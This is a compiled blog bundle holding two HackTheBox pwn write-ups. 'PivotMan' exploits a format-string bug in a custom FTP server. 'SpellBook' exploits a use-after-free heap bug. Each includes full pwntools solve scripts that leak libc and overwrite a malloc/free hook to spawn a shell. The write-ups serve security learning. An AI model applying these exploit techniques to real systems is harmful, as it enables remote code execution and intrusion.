"use strict";(self.webpackChunkzexionctf_github_io=self.webpackChunkzexionctf_github_io||[]).push([[1477],{10:n=>{n.exports=JSON.parse('{"blogPosts":[{"id":"Pivotman","metadata":{"permalink":"/blog/Pivotman","source":"@site/blog/2022-12-04-Pivotman/index.md","title":"PivotMan - HackTheBox","description":"Catergory:* Pwn","date":"2022-12-04T00:00:00.000Z","formattedDate":"December 4, 2022","tags":[{"label":"hackthebox","permalink":"/blog/tags/hackthebox"},{"label":"pwn","permalink":"/blog/tags/pwn"},{"label":"format string","permalink":"/blog/tags/format-string"},{"label":"one_gadget","permalink":"/blog/tags/one-gadget"},{"label":"custom_ftp_server","permalink":"/blog/tags/custom-ftp-server"}],"readingTime":3.7,"hasTruncateMarker":true,"authors":[{"name":"zexion","title":"Author of the blog","url":"https://github.com/zexionctf","imageURL":"https://github.com/zexionctf.png","key":"zexion"}],"frontMatter":{"slug":"Pivotman","title":"PivotMan - HackTheBox","authors":["zexion"],"tags":["hackthebox","pwn","format string","one_gadget","custom_ftp_server"]},"unlisted":false,"nextItem":{"title":"SpellBook - HackTheBox","permalink":"/blog/SpellBook"}},"content":"* **Catergory:** Pwn\\n* **Status:** Retired\\n\\n\x3c!--truncate--\x3e\\n\\n## Description\\n\\n[Pivotman](https://app.hackthebox.com/challenges/pivotman) is a easy rated challenge from HackTheBox. Its a custom ftp server, which has a unique FTP command called **BKDR** which suffers from format string vulnerabilty. From that vulnerability, we\'ll leak libc address, calculate base address, and overwrite ***__free_hook*** with one_gadget in order to pop a shell.\\n\\n## Decompilation\\n\\n![cmds](imgs/cmds.png)\\n\\n\\n![check](imgs/check.png)\\n\\nThere are default commands of FTP but we need login first, checking the decompiled part where it checks compares for username and password, we get both of them works with ;).\\n\\n![pass](imgs/pass.png)\\n\\nAnd this does work.\\n\\n![works](imgs/works.png)\\n\\nNow you can find all of the commands from the decompiler itself, or since you already know most of the ftp commands just happens to be 4 characters, string and then grep for string equals to 4 characters.\\n\\n```bash\\n\xbb strings chall| grep \'^....$\'\\nu+UH\\n< t\\n<Au1\\n<Iu1\\nUSER\\nPASS\\nRETR\\nSTOR\\nSTOU\\nAPPE\\nREST\\nRNFR\\nRNTO\\nABOR\\nDELE\\nCDUP\\nLIST\\nNLST\\nSITE\\nSTAT\\nHELP\\nNOOP\\nTYPE\\nPASV\\nPORT\\nSYST\\nQUIT\\nMDTM\\nSIZE\\nBKDR\\nDone\\nstat\\nputs\\natoi\\nfree\\n.bss\\n```\\n\\nNow BKDR does sound like backdoor, lets find a reference to it in decompiler and see how its working.\\n\\n![fmt](imgs/fmt.png)\\n\\nand that does look like a format string vulnerability since the buffer is straight being passed to vsnprintf. Testing theory confirms it.\\n\\n![pay](imgs/pay.png)\\n\\n## Exploit\\n\\nNow let\'s start with a wrapper script to fuzz for address that could be potentially libc\'s address. After few hits, 2739 seems to have constant offset to the libc\'s base.\\n\\n![libc](imgs/libc.png)\\n\\n```py title=\\"exploit.py\\"\\nfrom pwn import *\\nimport sys\\n\\ne = context.binary = ELF(\'./chall\')\\nlibc = e.libc\\ntry:\\n    host,port = sys.argv[1].split(\\":\\")\\n    p = remote(host,port)\\nexcept:\\n    p = e.process()\\n\\nfuzz_payload = lambda x : p.sendlineafter(b\'230 User logged in proceed \\\\r\\\\n\', x.encode())\\n\\nfor i in range(2700, 2800):\\n    p = e.process()\\n    p.sendlineafter(b\'220 Blablah FTP \\\\r\\\\n\', b\\"USER ;)\\")\\n    p.sendlineafter(b\'331 User name okay need password \\\\r\\\\n\', b\\"PASS ;)\\")\\n    fuzz_payload(f\\"BKDR %{i}$p\\")\\n    p.recvuntil(b\\"431136 BKDR \\")\\n    response = p.recvuntil(b\\" \\\\r\\\\n\\", drop=True)\\n    if b\\"0x7f\\" in response:\\n        print(f\\"Possible libc address at index {i} value {response}\\")\\n\\np.interactive()\\n```\\n\\nSimilarly to find from where our buffer starts:\\n\\n```py title=\\"exploit.py\\"\\nfor i in range(1000, 1100):\\n    p = e.process()\\n    p.sendlineafter(b\'220 Blablah FTP \\\\r\\\\n\', b\\"USER ;)\\")\\n    p.sendlineafter(b\'331 User name okay need password \\\\r\\\\n\', b\\"PASS ;)\\")\\n    fuzz_payload(f\\"BKDR AAAAAAAA %{i}$p\\")\\n    p.recvuntil(b\\"431136 BKDR \\")\\n    response = p.recvuntil(b\\" \\\\r\\\\n\\", drop=True)\\n    if b\\"0x41\\" in response:\\n        print(f\\"Our buffer starts from {i} value {response}\\")\\n```\\n\\n![buff](imgs/buff.png)\\n\\nFor ***RCE***, I\'ll overwrite ***__free_hook*** since `free` is called at the end of the function.\\n\\n![free](imgs/free.png)\\n\\n```bash\\n\xbb one_gadget libc.so.6\\n0xde78c execve(\\"/bin/sh\\", r15, r12)\\nconstraints:\\n  [r15] == NULL || r15 == NULL\\n  [r12] == NULL || r12 == NULL\\n\\n0xde78f execve(\\"/bin/sh\\", r15, rdx)\\nconstraints:\\n  [r15] == NULL || r15 == NULL\\n  [rdx] == NULL || rdx == NULL\\n\\n0xde792 execve(\\"/bin/sh\\", rsi, rdx)\\nconstraints:\\n  [rsi] == NULL || rsi == NULL\\n  [rdx] == NULL || rdx == NULL\\n```\\n\\n## Solve Script\\n\\n```py title=\\"exploit.py\\"\\nfrom pwn import *\\nimport sys\\n\\ne = context.binary = ELF(\'./chall\')\\nlibc = e.libc\\ntry:\\n    host,port = sys.argv[1].split(\\":\\")\\n    p = remote(host,port)\\nexcept:\\n    p = e.process()\\n\\nfmt_payload = lambda x : p.sendlineafter(b\'230 User logged in proceed \\\\r\\\\n\', x)\\nfuzz_payload = lambda x : p.sendlineafter(b\'230 User logged in proceed \\\\r\\\\n\', x.encode())\\n\\n\\"\\"\\"\\nfor i in range(2700, 2800):\\n    p = e.process()\\n    p.sendlineafter(b\'220 Blablah FTP \\\\r\\\\n\', b\\"USER ;)\\")\\n    p.sendlineafter(b\'331 User name okay need password \\\\r\\\\n\', b\\"PASS ;)\\")\\n    fuzz_payload(f\\"BKDR %{i}$p\\")\\n    p.recvuntil(b\\"431136 BKDR \\")\\n    response = p.recvuntil(b\\" \\\\r\\\\n\\", drop=True)\\n    if b\\"0x7f\\" in response:\\n        print(f\\"Possible libc address at index {i} value {response}\\")\\n\\"\\"\\"    \\n\\n\\"\\"\\"\\nfor i in range(1000, 1100):\\n    p = e.process()\\n    p.sendlineafter(b\'220 Blablah FTP \\\\r\\\\n\', b\\"USER ;)\\")\\n    p.sendlineafter(b\'331 User name okay need password \\\\r\\\\n\', b\\"PASS ;)\\")\\n    fuzz_payload(f\\"BKDR AAAAAAAA %{i}$p\\")\\n    p.recvuntil(b\\"431136 BKDR \\")\\n    response = p.recvuntil(b\\" \\\\r\\\\n\\", drop=True)\\n    if b\\"0x41\\" in response:\\n        print(f\\"Our buffer starts from {i} value {response}\\")\\n\\"\\"\\"\\n\\np.sendlineafter(b\'220 Blablah FTP \\\\r\\\\n\', b\\"USER ;)\\")\\np.sendlineafter(b\'331 User name okay need password \\\\r\\\\n\', b\\"PASS ;)\\")\\nfmt_payload(b\\"BKDR %2739$p\\")\\np.recvuntil(b\\"431136 BKDR \\")\\nlibc_leak = int(p.recvuntil(b\\" \\\\r\\\\n\\", drop=True), 16)\\nlog.info(f\\"libc leak : {hex(libc_leak)}\\")\\nlibc.address = libc_leak - 0x28565\\nlog.info(f\\"libc base leak : {hex(libc.address)}\\")\\n\\n\\"\\"\\"\\n0xde78c execve(\\"/bin/sh\\", r15, r12)\\nconstraints:\\n  [r15] == NULL || r15 == NULL\\n  [r12] == NULL || r12 == NULL\\n\\n0xde78f execve(\\"/bin/sh\\", r15, rdx)\\nconstraints:\\n  [r15] == NULL || r15 == NULL\\n  [rdx] == NULL || rdx == NULL\\n\\n0xde792 execve(\\"/bin/sh\\", rsi, rdx)\\nconstraints:\\n  [rsi] == NULL || rsi == NULL\\n  [rdx] == NULL || rdx == NULL\\n\\"\\"\\"\\n\\npayload = fmtstr_payload(1031, {libc.sym.__free_hook : (libc.address + 0xde78c)}, numbwritten=12)\\np.sendline(b\\"BKDR \\" + payload)\\n\\n#gdb.attach(p)\\np.interactive()\\n```"},{"id":"SpellBook","metadata":{"permalink":"/blog/SpellBook","source":"@site/blog/2022-12-03-Spellbook/index.md","title":"SpellBook - HackTheBox","description":"Category:* Pwn","date":"2022-12-03T00:00:00.000Z","formattedDate":"December 3, 2022","tags":[{"label":"hackthebox","permalink":"/blog/tags/hackthebox"},{"label":"pwn","permalink":"/blog/tags/pwn"},{"label":"fastbins","permalink":"/blog/tags/fastbins"},{"label":"one_gadget","permalink":"/blog/tags/one-gadget"}],"readingTime":5.675,"hasTruncateMarker":true,"authors":[{"name":"zexion","title":"Author of the blog","url":"https://github.com/zexionctf","imageURL":"https://github.com/zexionctf.png","key":"zexion"}],"frontMatter":{"slug":"SpellBook","title":"SpellBook - HackTheBox","authors":["zexion"],"tags":["hackthebox","pwn","fastbins","one_gadget"]},"unlisted":false,"prevItem":{"title":"PivotMan - HackTheBox","permalink":"/blog/Pivotman"}},"content":"* **Category:** Pwn\\n* **Status:** Retired\\n\\n\x3c!--truncate--\x3e\\n\\n## Description\\n\\n[Spellbook](https://app.hackthebox.com/challenges/spellbook) is a medium rated challenge from HackTheBox. Its a classic heap challenge where you have add, edit, delete and show functions. On delete function, the free\'d chunk is not being nulled, which leads to use-after-free case and a heap overflow in edit function ***Not used in this exploit***\\n\\n## Decompilation\\n\\nThe main function looks like:\\n```c\\nint __fastcall __noreturn main(int argc, const char **argv, const char **envp)\\n{\\n  size_t v3; // rax\\n\\n  setup();\\n  banner();\\n  while ( 1 )\\n  {\\n    while ( 1 )\\n    {\\n      while ( 1 )\\n      {\\n        v3 = menu();\\n        if ( v3 != 2 )\\n          break;\\n        show();\\n      }\\n      if ( v3 > 2 )\\n        break;\\n      if ( v3 != 1 )\\n        goto LABEL_13;\\n      add();\\n    }\\n    if ( v3 == 3 )\\n    {\\n      edit();\\n    }\\n    else\\n    {\\n      if ( v3 != 4 )\\n      {\\nLABEL_13:\\n        printf(\\"\\\\n%s[-] You are not a wizard! You are a muggle!\\\\n\\\\n\\", \\"\\\\x1B[1;31m\\");\\n        exit(22);\\n      }\\n      delete();\\n    }\\n  }\\n}\\n```\\n\\nadd function: \\n```c\\nvoid __fastcall add()\\n{\\n  int size; // [rsp+4h] [rbp-5Ch]\\n  size_t idx; // [rsp+8h] [rbp-58h]\\n  spl *spell; // [rsp+10h] [rbp-50h]\\n\\n  printf(format);\\n  idx = read_num();\\n  if ( idx <= 9 )\\n  {\\n    spell = (spl *)malloc(0x28uLL);\\n    printf(aInsert);\\n    spell->type[(int)(read(0, spell, 0x17uLL) - 1)] = 0;\\n    printf(aInsert_0);\\n    size = read_num();\\n    if ( size <= 0 || size > 1000 )\\n    {\\n      printf(\\"\\\\n%s[-] Such power is not allowed!\\\\n\\", \\"\\\\x1B[1;31m\\");\\n      exit(290);\\n    }\\n    spell->power = size;\\n    spell->sp = (char *)malloc(spell->power);\\n    printf(aEnter);\\n    spell->sp[(int)read(0, spell->sp, size - 1) - 1] = 0;\\n    table[idx] = spell;\\n    printf(aS_0, \\"\\\\x1B[1;32m\\", \\"\\\\x1B[1;34m\\");\\n  }\\n  else\\n  {\\n    printf(aS, \\"\\\\x1B[1;31m\\", \\"\\\\x1B[1;34m\\");\\n  }\\n}\\n```\\n\\nSummary:\\n* Can allocate upto 10 chunks\\n* Maximum size for the chunk is 1000\\n\\n\\nshow function:\\n```c\\nvoid __fastcall show()\\n{\\n  size_t idx; // [rsp+0h] [rbp-10h]\\n\\n  printf(format);\\n  idx = read_num();\\n  if ( idx <= 9 && table[idx] )\\n  {\\n    printf(asc_19A8);\\n    printf(table[idx]->type);\\n    printf(asc_19C6);\\n    printf(table[idx]->sp);\\n  }\\n  else\\n  {\\n    printf(aS, \\"\\\\x1B[1;31m\\", \\"\\\\x1B[1;34m\\");\\n  }\\n}\\n```\\n\\nThere is also a format string vulnerability, which can be used to get libc leak, but i\'ll be doing with unsorted bin.\\n\\nedit function:\\n```c\\nvoid __fastcall edit()\\n{\\n  size_t idx; // [rsp+8h] [rbp-18h]\\n  spl *new_spell; // [rsp+10h] [rbp-10h]\\n\\n  printf(format);\\n  idx = read_num();\\n  if ( idx <= 9 && table[idx] )\\n  {\\n    new_spell = table[idx];\\n    printf(aNew);\\n    new_spell->type[(int)(read(0, new_spell, 0x17uLL) - 1)] = 0;\\n    printf(aNew_0);\\n    new_spell->type[(int)(read(0, new_spell->sp, 0x1FuLL) - 1)] = 0;\\n    printf(aS_1, \\"\\\\x1B[1;32m\\", \\"\\\\x1B[1;34m\\");\\n  }\\n  else\\n  {\\n    printf(aS, \\"\\\\x1B[1;31m\\", \\"\\\\x1B[1;34m\\");\\n  }\\n}\\n```\\n\\nThe bug lies at the following line, again not using the vulnerability.\\n```c\\nnew_spell->type[(int)(read(0, new_spell->sp, 0x1FuLL) - 1)] = 0;\\n```\\n\\nand finally delete function:\\n```c\\nvoid __fastcall delete()\\n{\\n  size_t idx; // [rsp+8h] [rbp-18h]\\n  spl *ptr; // [rsp+10h] [rbp-10h]\\n\\n  printf(format);\\n  idx = read_num();\\n  if ( idx <= 9 && table[idx] )\\n  {\\n    ptr = table[idx];\\n    free(ptr->sp);\\n    free(ptr);\\n    printf(aS_2, \\"\\\\x1B[1;32m\\", \\"\\\\x1B[1;34m\\");\\n  }\\n  else\\n  {\\n    printf(aS, \\"\\\\x1B[1;31m\\", \\"\\\\x1B[1;34m\\");\\n  }\\n}\\n```\\n\\nHere lies the bug that I\'ll be exploiting to pop a shell. It frees `ptr->sp` and `ptr`, but doesn\'t nulls it out, leading to use-after-free.\\n\\n## Exploit\\n\\nwrapper for calling the functions in python.\\n\\n```python title=\\"exploit.py\\"\\nfrom pwn import *\\nimport sys\\n\\ne = ELF(\\"./spellbook\\")\\nlibc = e.libc\\ntry:\\n    host,port = sys.argv[1].split(\\":\\")\\n    p = remote(host,port)\\nexcept:\\n    p = e.process()\\n\\nc = lambda x: p.sendlineafter(b\\">> \\", str(x).encode())\\n\\ndef add(entry, types, power, data, shell=False):\\n    c(1)\\n    p.sendlineafter(b\\"entry: \\", str(entry).encode())\\n    if shell:\\n        return\\n    p.sendlineafter(b\\"type: \\", types)\\n    p.sendlineafter(b\\"power: \\", str(power).encode())\\n    p.sendlineafter(b\\": \\", data)\\n\\ndef show(idx):\\n    c(2)\\n    p.sendlineafter(b\\"entry: \\", str(idx).encode())\\n    p.recvuntil(b\\"       : \\")\\n    return p.recvuntil(b\\"\\\\n\\", drop=True)\\n\\ndef edit(idx, types, data):\\n    c(3)\\n    p.sendlineafter(b\\"entry: \\", str(idx).encode())\\n    p.sendlineafter(b\\"type: \\", types)\\n    p.sendlineafter(b\\": \\", data)\\n\\ndef free(idx):\\n    c(4)\\n    p.sendlineafter(b\\"entry: \\", str(idx).encode())\\n\\n#gdb.attach(p)\\np.interactive()\\n```\\n\\nLet\'s get a unsorted bin leak and then move on with the actual exploit. Create a maximum size of a chunk that the program allows, create another to prevent top chunk consolidation.\\n\\n```py title=\\"exploit.py\\"\\nadd(0, b\\"X\\", 0x3e8, b\\"A\\")\\nadd(1, b\\"X\\", 0x10, b\\"B\\")\\n\\nfree(0)\\n\\ngdb.attach(p)\\np.interactive()\\n```\\n\\n![unsortedbin](imgs/unsorted.png)\\n\\nSince there\'s use-after-free, we can view the idx 0 chunk to get a leak, and calculate libc\'s base address,\\n\\n![leak](imgs/leak.png)\\n\\n```py title=\\"exploit.py\\"\\nlibc_leak = u64(show(0) + b\\"\\\\x00\\\\x00\\")\\nlog.info(f\\"libc leak : { hex(libc_leak)} \\")\\nlibc.address = libc_leak - 0x3c4b78\\nlog.info(f\\"libc base leak : { hex(libc.address)} \\")\\n\\ngdb.attach(p)\\np.interactive()\\n```\\n\\n![leak](imgs/base.png)\\n\\nNow we\'ve defeated ASLR, we need to get a ***rce***. Because of use-after-free, we can actually change the fd of the already free\'d chunk to somewhere else. For now, I\'ll be changing the address to 0xdeadbeef. Let\'s setup similar scenario first.\\n\\n```py title=\\"exploit.py\\"\\nadd(2, b\\"X\\", 0x48, b\\"a\\")\\nadd(3, b\\"X\\", 0x48, b\\"b\\")\\n\\nfree(2)\\nfree(3)\\n```\\n\\n![list](imgs/fd.png)\\n\\nSince we can still edit the Chunk 1\'s FD, try to change it to somewhere else.\\n\\n```py title=\\"exploit.py\\"\\nedit(3, b\\"\\", p64(0xdeadbeef))\\n```\\n\\n![deadbeef](imgs/deadbeef.png)\\n\\nNow we can overwrite __free_hook with one_gadget, but that won\'t work since there is a size check in fastbins, [https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3319](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3319). So we need to find a address before either of the hook whose size is similar to the size of the bin. The simple way is to find a size of 0x7f, do the exploit in the size of 0x68 which will be in\\n```bash\\n[0x70]: Chunk 2 -> __free_hook\\n```\\n\\nNow generally there are no `0x7f` fake size chunks before ***__free_hook*** but there are before ***__malloc_hook***, so we\'ll be allocating before ***__malloc_hook***\\n\\n![fake](imgs/fake.png)\\n\\n```py title=\\"exploit.py\\"\\nadd(2, b\\"X\\", 0x68, b\\"a\\")\\nadd(3, b\\"X\\", 0x68, b\\"b\\")\\n\\nfree(2)\\nfree(3)\\n\\nedit(3, b\\"\\", p64(libc.address + 0x3c4aed))\\n```\\n\\n![hook](imgs/hook.png)\\n\\nBring to the head,\\n```py title=\\"exploit.py\\"\\nadd(5, b\\"X\\", 0x68, b\\"B\\")\\n```\\n\\nAnd now we allocate from the address, and overwrite with one_gadget ( can use system but one_gadget is life saver ).\\n\\n```bash\\n\xbb one_gadget glibc/libc.so.6\\n0x45226 execve(\\"/bin/sh\\", rsp+0x30, environ)\\nconstraints:\\n  rax == NULL\\n\\n0x4527a execve(\\"/bin/sh\\", rsp+0x30, environ)\\nconstraints:\\n  [rsp+0x30] == NULL\\n\\n0xf03a4 execve(\\"/bin/sh\\", rsp+0x50, environ)\\nconstraints:\\n  [rsp+0x50] == NULL\\n\\n0xf1247 execve(\\"/bin/sh\\", rsp+0x70, environ)\\nconstraints:\\n  [rsp+0x70] == NULL\\n```\\n\\n```py title=\\"exploit.py\\"\\nadd(4, b\\"X\\", 0x68, b\\"X\\"*0x13 + p64(libc.address + 0x4527a))\\n```\\n\\nAnd finally trigger the one_gadget with another malloc\\n```py title=\\"exploit.py\\"\\nadd(5, b\\"\\", 0x0, b\\"\\", shell=True)\\n```\\n\\n![shell](imgs/shell.png)\\n\\n## Solve Script\\n\\n```py title=\\"exploit.py\\"\\nfrom pwn import *\\nimport sys\\n\\ne = ELF(\\"./spellbook\\")\\nlibc = e.libc\\ntry:\\n    host,port = sys.argv[1].split(\\":\\")\\n    p = remote(host,port)\\nexcept:\\n    p = e.process()\\n\\nc = lambda x: p.sendlineafter(b\\">> \\", str(x).encode())\\n\\ndef add(entry, types, power, data, shell=False):\\n    c(1)\\n    p.sendlineafter(b\\"entry: \\", str(entry).encode())\\n    if shell:\\n        return\\n    p.sendlineafter(b\\"type: \\", types)\\n    p.sendlineafter(b\\"power: \\", str(power).encode())\\n    p.sendlineafter(b\\": \\", data)\\n\\ndef show(idx):\\n    c(2)\\n    p.sendlineafter(b\\"entry: \\", str(idx).encode())\\n    p.recvuntil(b\\"       : \\")\\n    return p.recvuntil(b\\"\\\\n\\", drop=True)\\n    \\ndef edit(idx, types, data):\\n    c(3)\\n    p.sendlineafter(b\\"entry: \\", str(idx).encode())\\n    p.sendlineafter(b\\"type: \\", types)\\n    p.sendlineafter(b\\": \\", data)\\n\\ndef free(idx):\\n    c(4)\\n    p.sendlineafter(b\\"entry: \\", str(idx).encode())\\n\\nadd(0, b\\"X\\", 0x3e8, b\\"A\\")\\nadd(1, b\\"X\\", 0x10, b\\"B\\")\\n\\nfree(0)\\nlibc_leak = u64(show(0) + b\\"\\\\x00\\\\x00\\")\\nlog.info(f\\"libc leak : { hex(libc_leak)} \\")\\nlibc.address = libc_leak - 0x3c4b78\\nlog.info(f\\"libc base leak : { hex(libc.address)} \\")\\n\\nadd(2, b\\"X\\", 0x68, b\\"a\\")\\nadd(3, b\\"X\\", 0x68, b\\"b\\")\\n\\nfree(2)\\nfree(3)\\n\\nedit(3, b\\"\\", p64(libc.address + 0x3c4aed))\\n\\nadd(5, b\\"X\\", 0x68, b\\"B\\")\\nadd(4, b\\"X\\", 0x68, b\\"X\\"*0x13 + p64(libc.address + 0x4527a))\\nadd(5, b\\"\\", 0x0, b\\"\\", shell=True)\\n\\n#gdb.attach(p)\\np.interactive()\\n```"}]}')}}]);